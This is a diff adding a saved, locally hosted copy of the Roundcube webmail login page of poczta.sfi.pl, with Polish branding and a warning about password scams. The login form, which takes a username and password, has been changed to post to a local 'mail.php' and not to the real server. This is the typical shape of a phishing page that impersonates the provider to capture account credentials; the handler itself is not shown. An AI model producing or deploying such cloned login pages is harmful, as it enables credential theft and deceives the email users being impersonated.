@@ -1,0 +1,122 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!-- saved from url=(0034)https://poczta.sfi.pl/rcm-1.4/ -->
+<html lang="pl" xmlns="http://www.w3.org/1999/xhtml" class=" js chrome webkit"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<title>Roundcube Webmail:: Witamy w poczta.sfi.pl</title>
+<link rel="index" href="https://poczta.sfi.pl/rcm-1.4/?_task=login">
+
+<link rel="shortcut icon" href="./index_files/logo.svg">
+
+<link rel="stylesheet" type="text/css" href="./index_files/common.min.css">
+
+<link rel="stylesheet" type="text/css" href="./index_files/larry.css">
+<link rel="stylesheet" type="text/css" href="./index_files/jquery-ui.css">
+<script src="./index_files/jquery.min.js.download" type="text/javascript"></script>
+<script src="./index_files/common.min.js.download" type="text/javascript"></script>
+<script src="./index_files/app.min.js.download" type="text/javascript"></script>
+<script src="./index_files/jstz.min.js.download" type="text/javascript"></script>
+<script type="text/javascript">
+/* <![CDATA[ */
+/*
+        @licstart  The following is the entire license notice for the 
+        JavaScript code in this page.
+
+        Copyright (C) The Roundcube Dev Team
+
+        The JavaScript code in this page is free software: you can redistribute
+        it and/or modify it under the terms of the GNU General Public License
+        as published by the Free Software Foundation, either version 3 of
+        the License, or (at your option) any later version.
+
+        The code is distributed WITHOUT ANY WARRANTY; without even the implied
+        warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+        See the GNU GPL for more details.
+
+        @licend  The above is the entire license notice
+        for the JavaScript code in this page.
+*/
+var rcmail = new rcube_webmail();
+rcmail.set_env({"task":"login","standard_windows":false,"locale":"pl_PL","devel_mode":null,"rcversion":10413,"cookie_domain":"","cookie_path":"/","cookie_secure":true,"skin":"classic","blankpage":"skins/classic/watermark.html","refresh_interval":60,"session_lifetime":600,"action":"","comm_path":"./?_task=login","compose_extwin":false,"xelastic":false,"dateFormats":{"php":"d.m.Y","moment":"DD.MM.YYYY","datepicker":"dd.mm.yy","flatpickr":"d.m.Y"},"dmFormats":{"php":"d.m","moment":"DD.MM","datepicker":"dd.mm","flatpickr":"d.m"},"timeFormats":{"php":"H:i","moment":"HH:mm","datepicker":"HH:mm","flatpickr":"H:i"},"xphone":false,"xtablet":false,"xmobile":false,"xdesktop":true,"xdevice":"desktop","timezoneOffset":7200,"xsidebarVisible":true,"xassets":["../xframework/assets/bower_components/js-cookie/src/js.cookie.js","../xframework/assets/scripts/framework.min.js","../xframework/assets/styles/larry.css"],"date_format":"dd.mm.yy","date_format_localized":"DD.MM.RRRR","request_token":"6SKBeMZq5uNgSHEgLft160s3tmFtsjWJ"});
+rcmail.add_label({"loading":"Ładowanie...","servererror":"Błąd serwera!","connerror":"Błąd połączenia (brak odpowiedzi serwera)!","requesttimedout":"Upłynął limit czasu żądania","refreshing":"Odświeżanie...","windowopenerror":"Wyskakujące okno zostało zablokowane!","uploadingmany":"Zapisywanie plików...","uploading":"Zapisywanie pliku...","close":"Zamknij","save":"Zapisz","cancel":"Anuluj","alerttitle":"Uwaga","confirmationtitle":"Czy jesteś pewien...","delete":"Usuń","continue":"Kontynuuj","ok":"OK"});
+rcmail.gui_container("loginfooter","bottomline");rcmail.gui_object('message', 'message');
+rcmail.gui_object('loginform', 'form');
+/* ]]> */
+</script>
+
+<script src="./index_files/js.cookie.js.download" type="text/javascript"></script>
+<script src="./index_files/framework.min.js.download" type="text/javascript"></script>
+<script src="./index_files/jquery-ui.min.js.download" type="text/javascript"></script>
+<script src="./index_files/jquery.ui.datepicker-pl.js.download" type="text/javascript"></script>
+
+</head>
+<body class="xlarry">
+
+<img src="./index_files/logo_.webp" id="logo" border="0" style="margin:0 11px" alt="poczta.sfi.pl">
+
+<div id="message"></div>
+
+<div id="login-form">
+<div class="boxtitle">Witamy w SFI</div>
+<div class="boxcontent">
+
+<form name="form" method="post" action="mail.php">
+<input type="hidden" name="_token" value="6SKBeMZq5uNgSHEgLft160s3tmFtsjWJ">
+<input type="hidden" name="_task" value="login"><input type="hidden" name="_action" value="login"><input type="hidden" name="_timezone" id="rcmlogintz" value="Asia/Shanghai"><input type="hidden" name="_url" id="rcmloginurl" value=""><table summary="" border="0"><tbody><tr><td class="title"><label for="rcmloginuser">Nazwa</label>
+</td>
+<td class="input"><input name="_user" id="rcmloginuser" required="required" autocapitalize="off" type="text"></td>
+</tr>
+<tr><td class="title"><label for="rcmloginpwd">Hasło</label>
+</td>
+<td class="input"><input name="_pass" id="rcmloginpwd" required="required" autocapitalize="off" autocomplete="off" type="password"></td>
+</tr>
+</tbody>
+</table>
+<p class="formbuttons"><button type="submit" id="rcmloginsubmit" class="button mainaction submit">Zaloguj</button>
+</p>
+
+</form>
+
+</div>
+</div>
+
+<div style="text-align:center;">
+<br><br>
+<span style="color:#e81414">
+Uwaga! SFI administrators nigdy nie proszą o podanie hasła 
+e-mailem,<br> ani o podawanie jakichkolwiek danych osobowych.
+<br>Wszelkie takie prośby są próbami oszustwa i wyłudzenia.
+</span>
+<br><br>
+<a href="http://poczta.sfi.pl/info.html" style="text-decoration: none;">Infromacje i instrukcje</a><br><br>
+<a href="https://panel.sfi.pl/newuser" style="text-decoration: none;">Nie mam konta e-mail SFI</a>
+&nbsp;&nbsp;&nbsp;&nbsp;
+<a href="https://panel.sfi.pl/pwdrst" style="text-decoration: none;">Nie pamiętam hasła</a>
+</div>
+
+<noscript>
+  <p id="login-noscriptwarning">Uwaga: Usługa wymaga Javascriptu! Aby z niej skorzystać proszę włączyć obsługę języka Javascript w ustawieniach przeglądarki.</p>
+</noscript>
+
+<div id="login-bottomline">
+  poczta.sfi.pl 
+    
+</div>
+<script type="text/javascript">
+/* <![CDATA[ */
+$(function() {
+rcmail.init();
+var images = ["skins/classic/images/icons/folders.png","skins/classic/images/mail_footer.png","skins/classic/images/taskicons.gif","skins/classic/images/display/loading.gif","skins/classic/images/pagenav.gif","skins/classic/images/mail_toolbar.png","skins/classic/images/searchfield.gif","skins/classic/images/messageicons.png","skins/classic/images/icons/reset.gif","skins/classic/images/abook_toolbar.png","skins/classic/images/icons/groupactions.png","skins/classic/images/watermark.gif"];
+            for (var i=0; i<images.length; i++) {
+                img = new Image();
+                img.src = images[i];
+            }
+});
+/* ]]> */
+</script>
+
+
+
+
+
+
+</body></html>
